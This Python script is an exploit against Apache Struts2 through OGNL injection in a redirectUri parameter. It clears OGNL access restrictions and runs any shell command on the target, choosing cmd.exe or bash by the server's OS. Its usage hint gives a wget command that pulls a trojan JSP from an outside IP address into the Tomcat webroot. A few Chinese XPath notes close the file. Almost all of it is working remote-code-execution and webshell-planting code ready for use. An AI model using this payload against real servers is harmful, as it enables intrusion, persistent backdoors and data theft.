import requests
import sys
from lxml import html

class Exploit:
    def exp(self,url,cmd):
        headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Referer':'http://96.63.216.104:8080/hello.action','Connection':'close','Cookie':'JSESSIONID=E25862AE388D006049EA9D3CEF12F246','Upgrade-Insecure-Requests':'1','Cache-Control':'max-age=0'}
        params={"redirectUri":"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"+"\n"}
        r=requests.post(url,headers=headers,params=params)
        page=r.text
        etree=html.etree
        page=etree.HTML(page)
        data=page.xpath('//body/p')
        print(data[0].text)

if __name__=='__main__':
    if len(sys.argv)!=3:
        print("[+]ussage: http://ip:端口/xxx.action cmd命令")
        print("[+]hint:wget%20-P%20/usr/local/tomcat/webapps/ROOT/%2096.63.216.104/1.jsp 下载木马")
        sys.exit()
    url=sys.argv[1]
    cmd=sys.argv[2]
    attack=Exploit()
    attack.exp(url,cmd)


#  * 	匹配任何元素节点。
# @*	匹配任何属性节点。
# node()	匹配任何类型的节点。